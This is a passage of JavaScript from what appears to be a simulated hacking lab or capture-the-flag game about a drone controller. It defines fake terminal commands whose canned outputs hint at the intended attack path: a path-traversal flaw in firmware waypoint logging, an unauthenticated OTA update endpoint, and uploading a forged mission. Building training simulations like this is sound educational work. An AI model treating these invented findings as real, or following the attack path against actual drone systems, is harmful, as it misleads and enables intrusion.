[+] SSH session established. You are now on DRONE-CTRL-01 as droneadmin.
[+] Context switched. Commands now execute on DRONE-CTRL-01.`;
            }
            return 'Usage: ssh [user@]hostname\nExample: ssh droneadmin@drone-ctrl.local';
        },

        'exit': function(args, term, engine) {
            if (D7Config._context === 'drone-ctrl') {
                D7Config._switchContext('operator', term);
                return 'Connection to drone-ctrl.local closed.\n[+] Returned to operator machine.';
            }
            return 'logout';
        },

        'ip': function(args) {
            if (D7Config._context === 'drone-ctrl') {
                return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.20.0.50/24 brd 10.20.0.255 scope global eth0`;
            }
            return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.20.0.5/24 brd 10.20.0.255 scope global eth0`;
        },

        'ifconfig': function(args) {
            return D7Config.commands.ip(args || []);
        },

        'ss': function(args) {
            if (D7Config._context === 'drone-ctrl') {
                return `State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22          0.0.0.0:*
LISTEN   0        128      0.0.0.0:80          0.0.0.0:*
LISTEN   0        128      0.0.0.0:8080        0.0.0.0:*
UNCONN   0        0        0.0.0.0:9000        0.0.0.0:*  (telemetry UDP)`;
            }
            return `State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22          0.0.0.0:*`;
        },

        'netstat': function(args) {
            return D7Config.commands.ss(args);
        },

        'grep': function(args) {
            const fullArgs = args.join(' ');
            if (fullArgs.includes('waypoint') || fullArgs.includes('path') || fullArgs.includes('traversal')) {
                if (fullArgs.includes('firmware') || fullArgs.includes('.bin')) {
                    D7Config._firmwareAnalyzed = true;
                    return `./logs/%s.tmp
TODO: sanitize waypoint_id before use as path
VULN: no path traversal check in log_waypoint()
parse_waypoint_id: no sanitization applied`;
                }
            }
            if (fullArgs.includes('hidden') || fullArgs.includes('payload') || fullArgs.includes('FLAG')) {
                if (fullArgs.includes('telemetry') || fullArgs.includes('.csv')) {
                    return '[No hidden payload in normal telemetry log — upload forged mission first.]';
                }
            }
            // Pass-through for general grep
            return null;
        },

        'wget': function(args) {
            const url = args.find(function(a) { return !a.startsWith('-'); }) || '';
            if (url.includes('drone-ctrl.local') || url.includes('10.20.0.50')) {
                return `--2026-03-18 04:15:00--  ${url}
Resolving drone-ctrl.local (drone-ctrl.local)... 10.20.0.50
Connecting to drone-ctrl.local (10.20.0.50)|10.20.0.50|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1248 (1.2K) [application/json]
Saving to: '${url.split('/').pop() || 'index.html'}'

${url.split('/').pop() || 'index.html'}   100%[=========>] 1.22K  --.-KB/s   in 0s

2026-03-18 04:15:00 (12.4 MB/s) - '${url.split('/').pop() || 'index.html'}' saved`;
            }
            return `wget: unable to resolve host address '${url}'`;
        },

        'nikto': function(args) {
            if (args.length === 0) return 'Usage: nikto -h <target>';
            return `- Nikto v2.5.0
+ Target IP:       10.20.0.50
+ Target Hostname: drone-ctrl.local
+ Target Port:     80
+ Server: nginx/1.24.0 (Ubuntu)
+ /ota/update: POST endpoint — no authentication (CVSS:9.1 AV:N/AC:L/PR:N/UI:N)
+ /firmware/: Directory listing denied (403)
+ /api/docs: API documentation exposed without auth
+ nginx/1.24.0 appears to be outdated (current is at least 1.26.1)
+ /ota/update: Accepts arbitrary JSON — no schema validation detected
+ 11 items checked: 5 findings`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(function(h) {
            html += `<th style="padding:6px 10px; text-align:left; color:#f39c12; border-bottom:2px solid #333; background:#0d1117; font-family:monospace;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(function(row) {
            html += '<tr>';
            row.forEach(function(cell) {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #1e1e2e; font-family:monospace; color:#ccc;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(function(table) {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(function(row) {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(function(c) { return c.textContent.trim().padEnd(20); });
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};
